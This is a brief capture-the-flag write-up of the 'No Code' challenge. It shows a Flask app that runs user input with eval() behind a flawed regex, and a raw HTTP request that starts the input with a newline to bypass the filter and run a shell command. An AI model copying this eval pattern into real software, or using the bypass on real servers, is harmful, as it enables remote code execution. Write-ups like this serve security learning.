# No Code
> I made a web app that lets you run any code you want. Just kidding!

## About the Challenge
We got a website and also a Python code. Here is the content of `app.py`

```python
from flask import Flask, request, jsonify
import re

app = Flask(__name__)

@app.route('/execute', methods=['POST'])
def execute_code():
    code = request.form.get('code', '')
    if re.match(".*[\x20-\x7E]+.*", code):
        return jsonify({"output": "jk lmao no code"}), 403
    result = ""
    try:
        result = eval(code)
    except Exception as e:
        result = str(e)

    return jsonify({"output": result}), 200

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=1337, debug=False)
```

In this case, we can execute a Python code but there's a regex here `.*[\x20-\x7E]+.*` (matches any string that has at least one printable ASCII character) so basically we "cant" input anything here

## How to Solve?
We can bypass it using a new line (\n) to execute a Python code. Here is the example

```
POST /execute HTTP/1.1
Host: uoftctf-no-code.chals.io
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

code=
__import__("os").system("ls")
```

> Since I can't access the website again, I will leave this writeup without the actual flag

## Flag
```
-
```